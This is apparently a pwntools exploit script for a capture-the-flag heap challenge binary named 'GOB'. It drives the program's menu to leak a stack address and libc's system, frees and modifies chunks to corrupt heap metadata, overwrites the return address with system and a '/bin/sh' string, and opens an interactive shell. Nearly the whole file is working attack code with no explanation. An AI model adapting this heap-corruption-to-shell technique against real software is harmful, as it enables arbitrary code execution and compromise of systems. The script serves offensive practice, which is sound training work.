from pwn import *

print("-------------------")
print("--------GOB--------")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")

#context.log_level='debug'


binary='./GOB'
s=process('./GOB')
#e=ELF(binary)

log.info("GOB loaded")


def tomain():
        s.sendline("5")
        s.recvuntil(">")

def Study(Member):
        s.sendline("1")
        s.recvuntil(">")
        s.sendline(Member)
        s.recvuntil(">")

def Manage():
        s.sendline("2")
        s.recvuntil(">")

def register(ID, NAME):
        s.sendline("1")
        s.recvuntil("ID : ")
        s.sendline(ID)
        s.recvuntil("NAME : ")
        s.sendline(NAME)
        s.recvuntil(">")

def Delete(Member):
        s.sendline("3")
        s.recvuntil(">")
        s.sendline(Member)
        s.recvuntil(">")

def Modify(Member, heaps):
        s.sendline("2")
        s.recvuntil(": ")
        s.sendline(Member)
        s.recvuntil(">")
        s.sendline("2")
        s.recvuntil("NAME : ")
        s.sendline(heaps)
        s.recvuntil(">")

def leak():
        s.sendline("4")
        s.recvuntil(">> ")


s.recvuntil(">")
Manage()

register("64", "64")
register("64", "64")
log.info("register 1,2")

tomain()
Study("1")
Manage()
leak()
stack_leak=int(s.recvuntil("\n"),16)
print 'leak : ' + str(hex(stack_leak))

s.sendline("415")
s.sendline("404")
s.recvuntil("Libc_system : ")
libc=int(s.recvuntil("\n"),16)
print 'libc : ' + str(hex(libc))
Delete("2")
Delete("1")
Modify("1", p64(stack_leak - 0x18))

register("64", "A" * 4)

s.sendline("1")
s.recvuntil("ID : ")
s.sendline("64")
s.recvuntil("NAME : ")
#gdb.attach(proc.pidof(s)[0])
s.sendline("/bin/sh;"*3+p64(libc)) #ret change(rip)
print 'Exploited by pwnWiz!'
s.interactive()
